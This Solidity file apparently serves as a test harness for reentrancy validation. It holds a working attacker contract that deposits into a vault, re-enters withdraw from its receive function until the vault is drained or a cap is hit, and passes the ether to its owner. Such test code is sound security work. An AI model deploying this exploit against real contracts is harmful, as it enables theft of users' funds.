// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVault {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function balances(address) external view returns (uint256);
}

/**
 * @title ValidationReentrantAttacker
 * @notice Attacker contract for reentrancy validation scenarios.
 *
 * Demonstrates a classic reentrancy attack:
 * 1. Deposit 1 ETH into the target vault
 * 2. Call withdraw(1 ETH)
 * 3. On receiving ETH, re-enter withdraw again before balances[attacker] is updated
 * 4. Repeat until vault is drained or gas runs out
 */
contract ValidationReentrantAttacker {
    IVault public target;
    address public owner;
    uint256 public attackAmount;
    uint256 public reentrancyCount;
    uint256 public maxReentrancies;

    event AttackStarted(address vault, uint256 amount);
    event ReentrancyAttempt(uint256 count, uint256 balance);
    event AttackComplete(uint256 stolen);

    constructor(address _target) {
        target = IVault(_target);
        owner = msg.sender;
        maxReentrancies = 5;
    }

    function setMaxReentrancies(uint256 n) external {
        require(msg.sender == owner, "Not owner");
        maxReentrancies = n;
    }

    /// @notice Step 1: Deposit into the target vault
    function deposit() external payable {
        target.deposit{value: msg.value}();
        attackAmount = msg.value;
    }

    /// @notice Step 2: Trigger the reentrancy attack
    function attack() external {
        require(attackAmount > 0, "Call deposit first");
        require(msg.sender == owner, "Not owner");
        reentrancyCount = 0;
        emit AttackStarted(address(target), attackAmount);
        target.withdraw(attackAmount);
    }

    /// @notice Fallback: called when vault sends ETH — re-enter if possible
    receive() external payable {
        reentrancyCount++;
        emit ReentrancyAttempt(reentrancyCount, address(target).balance);
        if (reentrancyCount < maxReentrancies && address(target).balance >= attackAmount) {
            target.withdraw(attackAmount);
        } else {
            emit AttackComplete(address(this).balance);
        }
    }

    function withdraw() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
